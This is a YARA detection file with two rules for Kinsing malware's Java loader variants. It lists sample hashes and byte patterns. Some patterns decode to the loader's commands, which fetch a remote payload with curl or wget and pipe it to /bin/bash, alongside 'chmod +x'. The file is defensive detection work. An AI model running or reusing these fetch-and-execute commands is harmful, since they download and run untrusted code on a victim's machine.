
rule Loader_JAVA_Kinsing_Aug_2020_Variant_A_1 {
   meta:
      description = "Detect Kinsing Variant A"
      author = "Arkbird_SOLG"
      reference1 = "https://twitter.com/IntezerLabs/status/1298992385041473547"
      reference2 = "https://twitter.com/JAMESWT_MHT/status/1299222198574632961"
      date = "2020-08-28"
      hash1 = "22063638b9f05870e14110ccab9e07d744204360b184cfec0075f9fd27e08488"
      hash2 = "248dd35d069d6b106b7528e41f95cd8cef0140fbb60808aa51c99ac117cf3318"
      hash3 = "6ec5b8ea86d0af908182d6afc63c85a817e0612dba6e5e4b126b5639ab048b16"
      hash4 = "b82d9e0ea2b6139438ce0b805fb03c3ae89ada9d4fdd7722562e6075f706048c"
   strings:
      $ClassCode1 = { 4c 69 66 45 78 70 2e 6a 61 76 61 0c 00 3f 00 40 } // LifExp.java\x0c\x00?\x00@
      $ClassCode2 = "java/lang/StringBuilder" fullword ascii
      $ClassCode3 = "java/net/URL" fullword ascii
      $ClassCode4 = "java/net/URLConnection" fullword ascii
      $ClassCode5 = { 6a 61 76 61 2f 6c 61 6e 67 2f 50 72 6f 63 65 73 73 42 75 69 6c 64 65 72 01 00 02 2e 2f } // java/lang/ProcessBuilder\x01\x00\x02./
      $Com1 = { 52 75 6E 74 69 6D 65 2E 67 65 74 52 75 6E 74 69 6D 65 28 29 2E 65 78 65 63 28 6E 65 77 20 53 74 72 69 6E 67 5B 5D 20 7B 20 22 2F 62 69 6E 2F 62 61 73 68 22 2C 20 22 2D 63 22 2C 20 22 63 75 72 6C 20 22 20 2B 20 73 20 2B 20 22 7C 73 68 22 20 7D } // Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "curl " + s + "|sh" }
      $Com2 = { 52 75 6E 74 69 6D 65 2E 67 65 74 52 75 6E 74 69 6D 65 28 29 2E 65 78 65 63 28 6E 65 77 20 53 74 72 69 6E 67 5B 5D 20 7B 20 22 2F 62 69 6E 2F 62 61 73 68 22 2C 20 22 2D 63 22 2C 20 22 77 67 65 74 20 2D 71 20 2D 4F 20 2D 20 22 20 2B 20 73 20 2B 20 22 7C 73 68 22 20 7D } // Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "wget -q -O - " + s + "|sh" }
      $Com3 = "chmod +x " fullword ascii
      $Com4 = { 53 4b 4c 01 00 02 6c 66 } // SKL\x01\x00\x02lf
      $s1 = "User-Agent" fullword ascii
      $s2 = "kinsing" fullword ascii
      $s3 =  { 6f 73 2e 6e 61 6d 65 } // os.name
      $s4 = "getAbsolutePath" fullword ascii
      $s5 = { 6f 70 65 6e 43 6f 6e 6e 65 63 74 69 6f 6e } // openConnection
   condition:
        filesize < 1KB and 4 of ($ClassCode*) and 3 of ($Com*) and 3 of ($s*) 
}

rule Loader_JAVA_Kinsing_Aug_2020_Variant_B_1 {
   meta:
      description = "Detect Kinsing Variant B"
      author = "Arkbird_SOLG"
      reference1 = "https://twitter.com/IntezerLabs/status/1298992385041473547"
      reference2 = "https://twitter.com/JAMESWT_MHT/status/1299222198574632961"
      date = "2020-08-28"
      hash1 = "e1471e8f9c1aa1457f819c0565a3444c53d3ec5fadf9f52ae988fde8e2d3a960"
      hash2 = "e70ea87d00567d33e20ed8649ef532eda966a8b5b1e83ea19728528d991eaaa0"
   strings:
      $ClassCode1 = { 4c 69 66 45 78 70 2e 6a 61 76 61 0c 00 3f 00 40 } // LifExp.java\x0c\x00?\x00@
      $ClassCode2 = "java/lang/StringBuilder" fullword ascii
      $ClassCode3 = "java/net/URL" fullword ascii
      $ClassCode4 = { 6a 61 76 61 2f 6c 61 6e 67 2f 50 72 6f 63 65 73 73 42 75 69 6c 64 65 72 01 00 02 2e 2f } // java/lang/ProcessBuilder\x01\x00\x02./ 
      $Com1 = "chmod +x " fullword ascii
      $Com2 = { 53 4b 4c 01 00 02 6c 66 } // SKL\x01\x00\x02lf
      $s1 = "kinsing" fullword ascii
      $s2 = "getAbsolutePath" fullword ascii
   condition:
        filesize < 1KB and 3 of ($ClassCode*) and 1 of ($Com*) and 2 of ($s*) 
}
